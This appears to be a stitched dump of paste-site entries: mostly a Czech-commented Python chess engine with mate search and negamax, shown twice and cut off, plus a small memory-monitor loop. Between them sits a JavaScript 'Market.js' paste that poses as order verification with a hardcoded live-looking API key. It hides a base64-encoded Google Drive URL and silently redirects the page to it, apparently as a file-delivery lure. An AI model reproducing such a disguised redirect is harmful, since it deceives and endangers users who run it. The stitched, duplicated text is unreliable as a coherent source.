###############################################################################
# Třída Board – reprezentuje šachovnici a umí ji inicializovat z FEN řetězce.
###############################################################################

class Board:
    def __init__(self, fen=None):
        """"""Inicializace šachovnice; pokud je zadán FEN, nastaví pozici podle něj.""""""
        self.grid = [[' ' for _ in range(8)] for _ in range(8)]
        self.to_move = 'w'
        self.castling_rights = set()  # např. {'K','Q','k','q'}
        self.en_passant = None       # (row, col) nebo None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        if fen:
            self.set_fen(fen)
    
    def set_fen(self, fen):
        """"""Nastaví šachovnici podle FEN řetězce.""""""
        parts = fen.split()
        while len(parts) < 6:
            parts.append('0')
        board_part, turn_part = parts[0], parts[1]
        castling_part = parts[2] if len(parts) > 2 else '-'
        en_passant_part = parts[3] if len(parts) > 3 else '-'
        halfmove = parts[4] if len(parts) > 4 else '0'
        fullmove = parts[5] if len(parts) > 5 else '1'
        self.grid = [['.' for _ in range(8)] for _ in range(8)]
        ranks = board_part.split('/')
        # FEN řady začínají od horní (8.) a jdou dolů
        for rank_idx, rank_str in enumerate(ranks):
            file_idx = 0
            for ch in rank_str:
                if ch.isdigit():
                    file_idx += int(ch)
                else:
                    self.grid[rank_idx][file_idx] = ch
                    file_idx += 1
        self.to_move = 'w' if turn_part == 'w' else 'b'
        self.castling_rights = set() if castling_part == '-' else set(castling_part)
        self.en_passant = None
        if en_passant_part != '-' and en_passant_part != '':
            file = ord(en_passant_part[0]) - ord('a')
            rank = int(en_passant_part[1])
            ri = 8 - rank
            fi = file
            if 0 <= ri < 8 and 0 <= fi < 8:
                self.en_passant = (ri, fi)
        try:
            self.halfmove_clock = int(halfmove)
        except:
            self.halfmove_clock = 0
        try:
            self.fullmove_number = int(fullmove)
        except:
            self.fullmove_number = 1
    
    def copy(self):
        """"""Vytvoří hlubokou kopii šachovnice.""""""
        new_board = Board()
        new_board.grid = [row.copy() for row in self.grid]
        new_board.to_move = self.to_move
        new_board.castling_rights = set(self.castling_rights)
        new_board.en_passant = None if self.en_passant is None else (self.en_passant[0], self.en_passant[1])
        new_board.halfmove_clock = self.halfmove_clock
        new_board.fullmove_number = self.fullmove_number
        return new_board

    def display(self):
        """"""Vrátí textovou reprezentaci šachovnice.""""""
        lines = []
        for ri in range(8):
            line = """"
            for fi in range(8):
                line += self.grid[ri][fi] + "" ""
            lines.append(line)
        return ""\n"".join(lines)

###############################################################################
# Funkce pro detekci šachu, generování tahů a jejich provádění
###############################################################################

def find_king(board, side):
    """"""Najde pozici krále pro stranu 'w' nebo 'b'.""""""
    target = 'K' if side=='w' else 'k'
    for r in range(8):
        for c in range(8):
            if board.grid[r][c] == target:
                return (r, c)
    return None

def is_square_attacked(board, r, c, by_side):
    """"""Zjistí, zda je pole (r,c) napadeno stranou by_side.""""""
    # Útoky pěšcem
    if by_side == 'b':
        if r+1 < 8 and c-1 >= 0 and board.grid[r+1][c-1] == 'p': return True
        if r+1 < 8 and c+1 < 8 and board.grid[r+1][c+1] == 'p': return True
    else:
        if r-1 >= 0 and c-1 >= 0 and board.grid[r-1][c-1] == 'P': return True
        if r-1 >= 0 and c+1 < 8 and board.grid[r-1][c+1] == 'P': return True
    
    # Útoky jezdcem a dalšími s jezdcovým pohybem (N, A, C, E)
    enemy_knights = ['n','a','c','e'] if by_side=='b' else ['N','A','C','E']
    for dr, dc in knight_moves:
        nr, nc = r+dr, c+dc
        if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] in enemy_knights:
            return True
    
    # Útoky po řadách/sloupcích (R, Q, E, A)
    enemy_rook_like = ['r','q','e','a'] if by_side=='b' else ['R','Q','E','A']
    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_rook_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Útoky diagonálně (B, Q, C, A)
    enemy_bishop_like = ['b','q','c','a'] if by_side=='b' else ['B','Q','C','A']
    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_bishop_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Sousední král
    enemy_king = 'k' if by_side=='b' else 'K'
    for dr in [-1,0,1]:
        for dc in [-1,0,1]:
            if dr==0 and dc==0: continue
            nr, nc = r+dr, c+dc
            if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] == enemy_king:
                return True
    
    return False

def is_in_check(board, side):
    """"""Zjistí, zda je král strany side ('w' nebo 'b') v šachu.""""""
    king_pos = find_king(board, side)
    if not king_pos:
        return False
    kr, kc = king_pos
    enemy_side = 'b' if side=='w' else 'w'
    return is_square_attacked(board, kr, kc, enemy_side)

def generate_pseudo_moves(board, side):
    """"""Generuje všechny pseudolegální tahy pro stranu side ('w' nebo 'b').""""""
    moves = []
    enemy = 'b' if side=='w' else 'w'
    is_white = (side=='w')
    pawn_dir = -1 if is_white else 1
    start_rank = 6 if is_white else 1
    promote_rank = 0 if is_white else 7
    for r in range(8):
        for c in range(8):
            piece = board.grid[r][c]
            if piece == '.': continue
            if is_white and not piece.isupper(): continue
            if not is_white and not piece.islower(): continue
            pt = piece.upper()
            if pt == 'P':
                nr = r + pawn_dir
                if 0<=nr<8 and board.grid[nr][c]=='.':
                    if nr==promote_rank:
                        for promo in ['Q','R','B','N','A','E','C']:
                            moves.append((r, c, nr, c, promo if is_white else promo.lower(), None))
                    else:
                        moves.append((r, c, nr, c, None, None))
                    if r==start_rank and board.grid[r+pawn_dir*2][c]=='.' and board.grid[r+pawn_dir][c]=='.':
                        moves.append((r, c, r+pawn_dir*2, c, None, 'double'))
                for dc in [-1,1]:
                    nc = c + dc
                    if 0<=nc<8 and 0<=nr<8:
                        if board.grid[nr][nc] != '.' and ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                            if nr==promote_rank:
                                for promo in ['Q','R','B','N','A','E','C']:
                                    moves.append((r, c, nr, nc, promo if is_white else promo.lower(), None))
                            else:
                                moves.append((r, c, nr, nc, None, None))
                        if board.en_passant == (nr, nc):
                            moves.append((r, c, nr, nc, None, 'enpassant'))
            elif pt == 'K':
                for dr in [-1,0,1]:
                    for dc in [-1,0,1]:
                        if dr==0 and dc==0: continue
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Rošády (základní verze)
                if is_white and r==7 and c==4:
                    if 'K' in board.castling_rights and board.grid[7][5]=='.' and board.grid[7][6]=='.':
                        moves.append((7,4,7,6,None,'castle'))
                    if 'Q' in board.castling_rights and board.grid[7][3]=='.' and board.grid[7][2]=='.' and board.grid[7][1]=='.':
                        moves.append((7,4,7,2,None,'castle'))
                if not is_white and r==0 and c==4:
                    if 'k' in board.castling_rights and board.grid[0][5]=='.' and board.grid[0][6]=='.':
                        moves.append((0,4,0,6,None,'castle'))
                    if 'q' in board.castling_rights and board.grid[0][3]=='.' and board.grid[0][2]=='.' and board.grid[0][1]=='.':
                        moves.append((0,4,0,2,None,'castle'))
            else:
                # Tahy pro figury s jezdcovým pohybem (N, A, C, E)
                if pt in ['N','A','C','E']:
                    for dr, dc in knight_moves:
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Klouzavé tahy – pro R, Q, E, A
                if pt in ['R','Q','E','A']:
                    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
                if pt in ['B','Q','C','A']:
                    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
    return moves

def get_legal_moves(board, side):
    """"""Vrátí seznam legálních tahů pro danou stranu.""""""
    moves = generate_pseudo_moves(board, side)
    legal_moves = []
    for move in moves:
        make_move(move, board)
        if not is_in_check(board, side):
            legal_moves.append(move)
        undo_move(board)
    return legal_moves

# Zásobník pro tahy (pro undo)
move_stack = []

def make_move(move, board):
    """"""Provede tah na šachovnici a uloží stav pro možnost undo.
       move: (r1, c1, r2, c2, promo, special)""""""
    r1, c1, r2, c2, promo, special = move
    piece = board.grid[r1][c1]
    captured = board.grid[r2][c2] if special != 'enpassant' else ('p' if piece=='P' else 'P')
    prev_state = (set(board.castling_rights), board.en_passant)
    move_stack.append((r1, c1, r2, c2, promo, special, piece, captured, prev_state))
    board.grid[r1][c1] = '.'
    if special == 'castle':
        board.grid[r2][c2] = piece
        if piece == 'K':
            if c2 == 6:
                board.grid[7][5] = 'R'; board.grid[7][7] = '.'
            else:
                board.grid[7][3] = 'R'; board.grid[7][0] = '.'
        else:
            if c2 == 6:
                board.grid[0][5] = 'r'; board.grid[0][7] = '.'
            else:
                board.grid[0][3] = 'r'; board.grid[0][0] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = piece
        if piece == 'P':
            board.grid[r2+1][c2] = '.'
        else:
            board.grid[r2-1][c2] = '.'
    else:
        board.grid[r2][c2] = promo if promo else piece
    if piece == 'K':
        board.castling_rights.discard('K'); board.castling_rights.discard('Q')
    if piece == 'k':
        board.castling_rights.discard('k'); board.castling_rights.discard('q')
    if piece == 'R' and (r1, c1)==(7,7):
        board.castling_rights.discard('K')
    if piece == 'R' and (r1, c1)==(7,0):
        board.castling_rights.discard('Q')
    if piece == 'r' and (r1, c1)==(0,7):
        board.castling_rights.discard('k')
    if piece == 'r' and (r1, c1)==(0,0):
        board.castling_rights.discard('q')
    if special == 'double':
        board.en_passant = (r1 + (-1 if board.to_move=='w' else 1), c1)
    else:
        board.en_passant = None
    board.to_move = 'b' if board.to_move=='w' else 'w'

def undo_move(board):
    """"""Vrátí poslední provedený tah.""""""
    r1, c1, r2, c2, promo, special, piece, captured, prev_state = move_stack.pop()
    board.grid[r1][c1] = piece
    if special == 'castle':
        board.grid[r2][c2] = '.'
        if piece == 'K':
            if c2 == 6:
                board.grid[7][7] = 'R'; board.grid[7][5] = '.'
            else:
                board.grid[7][0] = 'R'; board.grid[7][3] = '.'
        else:
            if c2 == 6:
                board.grid[0][7] = 'r'; board.grid[0][5] = '.'
            else:
                board.grid[0][0] = 'r'; board.grid[0][3] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = '.'
        if piece == 'P':
            board.grid[r2+1][c2] = 'p'
        else:
            board.grid[r2-1][c2] = 'P'
    else:
        board.grid[r2][c2] = captured
    board.castling_rights, board.en_passant = prev_state
    board.to_move = 'b' if board.to_move=='w' else 'w'

###############################################################################
# Jednoduchá funkce pro zjištění, zda je mat v určité hloubce 
# (pro pomoc s detekcí matů za určitý počet tahů)
###############################################################################

def is_mate_in_n(board, side, depth):
    """"""Zkontroluje, zda je pozice mat (pro stranu side) v zadané hloubce.""""""
    if depth == 0:
        # Kontrola matu
        legal_moves = get_legal_moves(board, side)
        return not legal_moves and is_in_check(board, side)
    
    # Rekurzivní kontrola pro stranu side (zda má vynucený mat)
    legal_moves = get_legal_moves(board, side)
    
    if not legal_moves:
        return False  # Nemáme tahy, nemůžeme dát mat
    
    # Zkontrolujeme všechny tahy, musí existovat alespoň jeden, který vede k matu
    opponent = 'b' if side=='w' else 'w'
    for move in legal_moves:
        make_move(move, board)
        # Pro všechny odpovědi protivníka musí být mat
        opponent_can_avoid_mate = False
        opponent_legal_moves = get_legal_moves(board, opponent)
        
        if not opponent_legal_moves:
            # Protivník nemá tahy - buď je to mat nebo pat
            if is_in_check(board, opponent):
                undo_move(board)
                return True  # Již nyní máme mat
            # Jinak je to pat a to není výhra
        
        # Pokud má protivník tahy, musíme prověřit všechny
        for op_move in opponent_legal_moves:
            make_move(op_move, board)
            if not is_mate_in_n(board, side, depth-1):
                opponent_can_avoid_mate = True
            undo_move(board)
            if opponent_can_avoid_mate:
                break
        
        undo_move(board)
        
        # Pokud protivník nemůže vyhnout matu, máme mat za 'depth' tahů
        if not opponent_can_avoid_mate:
            return True
    
    return False

###############################################################################
# Negamax s alfa-beta ořezáváním pro hledání nejlepší sekvence
###############################################################################

def negamax(board, depth, alpha, beta, side):
    """"""Negamax s alfa-beta ořezáváním.
       side: 1 pro bílého, -1 pro černého.
       Vrací (hodnota, tahová sekvence).""""""
    # Koncové podmínky - mat (nebo pat když depth=0)
    curr_color = 'w' if side == 1 else 'b'
    legal_moves = get_legal_moves(board, curr_color)
    
    # Kontrola na mat nebo pat (terminální stavy)
    if not legal_moves:
        if is_in_check(board, curr_color):
            return -inf, []  # Mat
        return 0, []  # Pat
    
    # Dosáhli jsme maximální hloubky - základní ohodnocení
    if depth == 0:
        # Kontrola, zda máme mat v nejbližších tazích
        enemy_color = 'b' if curr_color == 'w' else 'w'
        for move in legal_moves:
            make_move(move, board)
            enemy_legal_moves = get_legal_moves(board, enemy_color)
                
            if not enemy_legal_moves and is_in_check(board, enemy_color):
                undo_move(board)
                return inf, [move]  # Našli jsme mat
            undo_move(board)
        
        # Pro jednoduchost zde neohodnocujeme materiál, pozici atd.
        # V reálném šachovém enginu bychom zde vraceli pozici na základě materiálu, struktury pěšců atd.
        return 0, []
    
    best_val = -inf
    best_line = []
    
    # Seřazení tahů pro alfa-beta
    legal_moves.sort(key=lambda m: 1 if board.grid[m[2]][m[3]] != '.' else 0, reverse=True)
    
    for move in legal_moves:
        make_move(move, board)
        val, line = negamax(board, depth-1, -beta, -alpha, -side)
        val = -val
        undo_move(board)
        
        if val > best_val:
            best_val = val
            best_line = [move] + line
        
        alpha = max(alpha, best_val)
        if alpha >= beta:
            break
    
    return best_val, best_line

###############################################################################
# Iterativní prohlubování – hledáme do maximální hloubky a vypisujeme uplynulý čas
###############################################################################

def iterative_deepening(board, max_depth=50, time_limit=300):
    """"""Iterativní prohlubování s časovým limitem (výchozí 5 minut).""""""
    global running, start_time
    
    # Spuštění časovacího vlákna
    running = True
    start_time = time.time()
    timer_thread = threading.Thread(target=time_reporter)
    timer_thread.daemon = True
    timer_thread.start()
    
    best_line = []
    best_val = 0
    
    try:
        # Nejdříve zkontrolujeme, zda máme vůbec nějaké legální tahy
        curr_side = board.to_move
        enemy_side = 'b' if curr_side=='w' else 'w'
        
        legal_moves = get_legal_moves(board, curr_side)
        
        # Pokud nemáme žádné legální tahy, je to pat nebo mat
        if not legal_moves:
            total_elapsed = time.time() - start_time
            running = False
            if is_in_check(board, curr_side):
                return -inf, [], total_elapsed  # Mat
            return 0, [], total_elapsed  # Pat
        
        # Zkontrolujeme, zda máme mat v jednom tahu
        for move in legal_moves:
            make_move(move, board)
            enemy_legal = get_legal_moves(board, enemy_side)
            
            if not enemy_legal and is_in_check(board, enemy_side):
                # Našli jsme mat v jednom tahu
                undo_move(board)
                running = False
                return inf, [move], 0.1
            undo_move(board)
        
        # Pokud máme jen jeden legální tah, vrátíme ho bez dalšího počítání
        if len(legal_moves) == 1:
            running = False
            return 0, legal_moves, 0.1
        
        # Nyní začněme iterativní prohlubování
        for depth in range(1, max_depth+1):
            t0 = time.time()
            val, line = negamax(board, depth, -inf, inf, 1 if board.to_move=='w' else -1)
            t1 = time.time()
            elapsed = time.time() - start_time
            
            # Výpis času po dosažení každé hloubky
            hrs = int(elapsed // 3600)
            mins = int((elapsed % 3600) // 60)
            secs = int(elapsed % 60)
            
            # Po výpisu každé hloubky přejdeme na nový řádek
            move_time = t1 - t0
            sys.stdout.write(""\n"")  # Nový řádek po časovém informačním řádku
            print(f""Hloubka {depth:2d} – uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s (poslední krok: {move_time:.2f}s)"")
            
            # Zobrazení aktuální nejlepší pozice pro tuto hloubku
            if line:
                print(f""\nNejlepší sekvence v hloubce {depth}:"")
                variant_board = board.copy()
                
                # Oprava: Použijeme celou sekvenci tahů, ne jen první tah
                for i, move in enumerate(line):
                    make_move(move, variant_board)
                    move_notation = move_to_notation(move)
                    print(f""Tah {i+1}: {move_notation}"")
                
                print(variant_board.display())
                print(""-"" * 40)
            else:
                print(""\nŽádná nalezená sekvence v této hloubce."")
            
            # Aktualizujeme nejlepší nalezenou sekvenci
            best_val = val
            best_line = line
            
            # Pokud jsme našli vynucený mat nebo pat, končíme
            if abs(val) == inf or time.time() - start_time > time_limit:
                if time.time() - start_time > time_limit:
                    print(f""Časový limit vypršel po {time_limit} sekundách"")
                break
        
        # Ověření, že když máme tahy, tak vrátíme nejlepší z nich (i když je remíza)
        if not best_line and legal_moves:
            best_line = [legal_moves[0]]
                
        total_elapsed = time.time() - start_time
        return best_val, best_line, total_elapsed
    
    finally:
        # Zajistíme ukončení časovacího vlákna
        running = False
        timer_thread.join(timeout=1.0)
        # Přejdeme na nový řádek po posledním časovém výpisu
        sys.stdout.write(""\n"")
        sys.stdout.flush()

###############################################################################
# Testovací funkce pro kontrolu, zda jsou tahy e4 správně generovány
###############################################################################

def debug_king_moves(fen=""8/8/8/8/8/kq2K3/8/8 w - - 0 1""):
    """"""Testovací funkce pro zobrazení generovaných tahů krále.""""""
    board = Board(fen)
    print(""Pozice:"")
    print(board.display())
    
    side = board.to_move
    king_pos = find_king(board, side)
    if not king_pos:
        print(""Král nenalezen!"")
        return
    
    kr, kc = king_pos
    print(f""Král na pozici: {'abcdefgh'[kc]}{8-kr} ({kr},{kc})"")
    
    # Generujeme tahy krále
    king_moves = []
    for dr in [-1, 0, 1]:
        for dc in [-1, 0, 1]:
            if dr == 0 and dc == 0:
                continue
            nr, nc = kr + dr, kc + dc
            if 0 <= nr < 8 and 0 <= nc < 8:
                king_moves.append((nr, nc))
    
    print(""Možné tahy krále:"")
    for nr, nc in king_moves:
        # Zjistíme, zda je tam vlastní figura
        piece = board.grid[nr][nc]
        enemy_side = 'b' if side == 'w' else 'w'
        attacked = is_square_attacked(board, nr, nc, enemy_side)
        
        status = """"
        if piece != '.':
            is_own = (side == 'w' and piece.isupper()) or (side == 'b' and piece.islower())
            if is_own:
                status = ""vlastní figura""
            else:
                status = f""soupeřova figura {piece}""
        
        if attacked:
            status += "" (napadeno)""
        
        if not status:
            status = ""volné pole""
        
        print(f""  {'abcdefgh'[nc]}{8-nr} ({nr},{nc}): {status}"")
    
    # Generování legálních tahů pomocí generate_pseudo_moves
    print(""\nLegální tahy podle generate_pseudo_moves:"")
    moves = generate_pseudo_moves(board, side)
    king_moves = []
    for move in moves:
        r1, c1, r2, c2, _, _ = move
        if r1 == kr and c1 == kc:
            king_moves.append(move)
    
    for move in king_moves:
        r1, c1, r2, c2, _, _ = move
        make_move(move, board)
        in_check = is_in_check(board, side)
        undo_move(board)
        
        print(f""  {'abcdefgh'[c1]}{8-r1} -> {'abcdefgh'[c2]}{8-r2}: {'nelegální (šach)' if in_check else 'legální'}"")

###############################################################################
# Převod tahu do šachové notace
###############################################################################

def move_to_notation(move):
    cols = ""abcdefgh""
    r1, c1, r2, c2, promo, special = move
    if special == 'castle':
        return ""O-O"" if c2 > c1 else ""O-O-O""
    s = cols[c1] + str(8 - r1) + cols[c2] + str(8 - r2)
    if promo:
        s += ""="" + promo.upper()
    if special == 'enpassant':
        s += "" e.p.""
    return s

###############################################################################
# Analýza pozice pro určení výsledku
###############################################################################

def analyze_position(board):
    """"""Analyzuje pozici a vrací výsledek.""""""
    # Zjistíme stranu na tahu
    side_to_move = board.to_move
    
    # Zjistíme, zda má strana na tahu legální tahy
    legal_moves = get_legal_moves(board, side_to_move)
    
    # Kontrola na mat nebo pat
    if not legal_moves:
        if is_in_check(board, side_to_move):
            if side_to_move == 'w':
                return ""Mat – černý vyhrává""
            else:
                return ""Mat – bílý vyhrává""
        else:
            return ""Pat (remíza)""
    
    # Zjistíme, zda po provedení tahu bude mat
    for move in legal_moves:
        make_move(move, board)
        opponent = 'b' if side_to_move == 'w' else 'w'
        opponent_legal_moves = get_legal_moves(board, opponent)
        
        if not opponent_legal_moves and is_in_check(board, opponent):
            undo_move(board)
            if side_to_move == 'w':
                return ""Mat v příštím tahu – bílý vyhrává""
            else:
                return ""Mat v příštím tahu – černý vyhrává""
        undo_move(board)
    
    # Pokud nemáme ani mat ani pat, pozice je otevřená
    return ""Pozice není rozhodnuta""

###############################################################################
# Hlavní program – inicializace z FEN a výpis optimální tahové sekvence
###############################################################################

def main():
    # Nastavíme pozici ze zadaného FEN
    fen = ""8/6A1/8/8/8/k1K5/8/8 w - - 0 1""
    fen = ""8/8/8/8/8/kq2K3/8/8 w - - 0 1""

    # Další příklad pozice
    #fen = ""8/8/8/8/8/kq2K3/6A1/8 w - - 0 1""
    
    # Nejprve spustíme debug pro ověření tahů krále
    print(""DEBUG TAHŮ KRÁLE:"")
    print(""-"" * 40)
    debug_king_moves(fen)
    print(""-"" * 40)
    
    board_obj = Board(fen)
    board = board_obj.copy()
    
    print(""Počáteční pozice:"")
    print(board.display())
    print(""\nVyhledávání optimální tahové sekvence – iterativní prohlubování...\n"")
    
    # Nastavíme časový limit na 5 minut (300 sekund)
    best_val, best_line, total_elapsed = iterative_deepening(board, max_depth=500, time_limit=inf)
    hrs = int(total_elapsed // 3600)
    mins = int((total_elapsed % 3600) // 60)
    secs = int(total_elapsed % 60)
    
    variant_board = board.copy()
    moves_notation = []
    print(""Postup tahů:"")
    print(""-""*40)
    print(""Start:"")
    print(variant_board.display())
    print(""-""*40)
    
    # Vykonání sekvence tahů a zobrazení průběhu
    for move in best_line:
        s = move_to_notation(move)
        moves_notation.append(s)
        make_move(move, variant_board)
        print(""Tah:"", s)
        print(variant_board.display())
        print(""-""*40)
    
    # Vyhodnocení výsledné pozice
    if best_val == inf:
        result_text = ""Mat – bílý vyhrává""
    elif best_val == -inf:
        result_text = ""Mat – černý vyhrává""
    else:
        # Pokud engine nenašel jednoznačný výsledek, analyzujeme pozici znovu
        result_text = analyze_position(variant_board)
    
    print(""Optimální tahová sekvence:"", "" "".join(moves_notation) if moves_notation else ""(žádný tah)"")
    print(""Výsledek:"", result_text)
    print(f""Celkový uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")

if __name__ == '__main__':
    main()"
nCbYdrQ5,Memory Seconds - 01,d5mb0,Python,Tuesday 1st of April 2025 05:06:25 AM CDT,"import os
while True:
	print(""\nMemoria Foda:\n"")
	os.system(""free -h; sleep 2"")
	
'''
Name: Memory Seconds Two
Date: 01.04.2025
Author: Oasis
Observation: Roda em python3, deixe rodando em segundo plano. 
'''"
z9yYUTfG,Market.js,WassupDog45,JavaScript,Tuesday 1st of April 2025 04:40:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/627/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xAm8vJs0,posledni kqK cas i vse ostatni OK,max2201111,Python,Tuesday 1st of April 2025 04:32:07 AM CDT,"#!/usr/bin/env python3
import time
import threading
import sys
from math import inf

# Globální konstanty – pohyby jezdce (relativní souřadnice)
knight_moves = [(2,1),(2,-1),(-2,1),(-2,-1),(1,2),(1,-2),(-1,2),(-1,-2)]

# Globální proměnné pro sledování času
running = False
start_time = 0

###############################################################################
# Funkce pro výpis času v samostatném vlákně
###############################################################################

def time_reporter():
    """"""Funkce pro výpis aktuálního času každou sekundu na stejném řádku.""""""
    global running, start_time
    while running:
        elapsed = time.time() - start_time
        hrs = int(elapsed // 3600)
        mins = int((elapsed % 3600) // 60)
        secs = int(elapsed % 60)
        
        # Použijeme \r pro návrat na začátek řádku a přepsání předchozího výpisu
        sys.stdout.write(f""\r[INFO] Uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")
        sys.stdout.flush()
        
        time.sleep(1)

###############################################################################
# Třída Board – reprezentuje šachovnici a umí ji inicializovat z FEN řetězce.
###############################################################################

class Board:
    def __init__(self, fen=None):
        """"""Inicializace šachovnice; pokud je zadán FEN, nastaví pozici podle něj.""""""
        self.grid = [[' ' for _ in range(8)] for _ in range(8)]
        self.to_move = 'w'
        self.castling_rights = set()  # např. {'K','Q','k','q'}
        self.en_passant = None       # (row, col) nebo None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        if fen:
            self.set_fen(fen)
    
    def set_fen(self, fen):
        """"""Nastaví šachovnici podle FEN řetězce.""""""
        parts = fen.split()
        while len(parts) < 6:
            parts.append('0')
        board_part, turn_part = parts[0], parts[1]
        castling_part = parts[2] if len(parts) > 2 else '-'
        en_passant_part = parts[3] if len(parts) > 3 else '-'
        halfmove = parts[4] if len(parts) > 4 else '0'
        fullmove = parts[5] if len(parts) > 5 else '1'
        self.grid = [['.' for _ in range(8)] for _ in range(8)]
        ranks = board_part.split('/')
        # FEN řady začínají od horní (8.) a jdou dolů
        for rank_idx, rank_str in enumerate(ranks):
            file_idx = 0
            for ch in rank_str:
                if ch.isdigit():
                    file_idx += int(ch)
                else:
                    self.grid[rank_idx][file_idx] = ch
                    file_idx += 1
        self.to_move = 'w' if turn_part == 'w' else 'b'
        self.castling_rights = set() if castling_part == '-' else set(castling_part)
        self.en_passant = None
        if en_passant_part != '-' and en_passant_part != '':
            file = ord(en_passant_part[0]) - ord('a')
            rank = int(en_passant_part[1])
            ri = 8 - rank
            fi = file
            if 0 <= ri < 8 and 0 <= fi < 8:
                self.en_passant = (ri, fi)
        try:
            self.halfmove_clock = int(halfmove)
        except:
            self.halfmove_clock = 0
        try:
            self.fullmove_number = int(fullmove)
        except:
            self.fullmove_number = 1
    
    def copy(self):
        """"""Vytvoří hlubokou kopii šachovnice.""""""
        new_board = Board()
        new_board.grid = [row.copy() for row in self.grid]
        new_board.to_move = self.to_move
        new_board.castling_rights = set(self.castling_rights)
        new_board.en_passant = None if self.en_passant is None else (self.en_passant[0], self.en_passant[1])
        new_board.halfmove_clock = self.halfmove_clock
        new_board.fullmove_number = self.fullmove_number
        return new_board

    def display(self):
        """"""Vrátí textovou reprezentaci šachovnice.""""""
        lines = []
        for ri in range(8):
            line = """"
            for fi in range(8):
                line += self.grid[ri][fi] + "" ""
            lines.append(line)
        return ""\n"".join(lines)

###############################################################################
# Funkce pro detekci šachu, generování tahů a jejich provádění
###############################################################################

def find_king(board, side):
    """"""Najde pozici krále pro stranu 'w' nebo 'b'.""""""
    target = 'K' if side=='w' else 'k'
    for r in range(8):
        for c in range(8):
            if board.grid[r][c] == target:
                return (r, c)
    return None

def is_square_attacked(board, r, c, by_side):
    """"""Zjistí, zda je pole (r,c) napadeno stranou by_side.""""""
    # Útoky pěšcem
    if by_side == 'b':
        if r+1 < 8 and c-1 >= 0 and board.grid[r+1][c-1] == 'p': return True
        if r+1 < 8 and c+1 < 8 and board.grid[r+1][c+1] == 'p': return True
    else:
        if r-1 >= 0 and c-1 >= 0 and board.grid[r-1][c-1] == 'P': return True
        if r-1 >= 0 and c+1 < 8 and board.grid[r-1][c+1] == 'P': return True
    
    # Útoky jezdcem a dalšími s jezdcovým pohybem (N, A, C, E)
    enemy_knights = ['n','a','c','e'] if by_side=='b' else ['N','A','C','E']
    for dr, dc in knight_moves:
        nr, nc = r+dr, c+dc
        if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] in enemy_knights:
            return True
    
    # Útoky po řadách/sloupcích (R, Q, E, A)
    enemy_rook_like = ['r','q','e','a'] if by_side=='b' else ['R','Q','E','A']
    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_rook_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Útoky diagonálně (B, Q, C, A)
    enemy_bishop_like = ['b','q','c','a'] if by_side=='b' else ['B','Q','C','A']
    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_bishop_like:
                    return True
                break
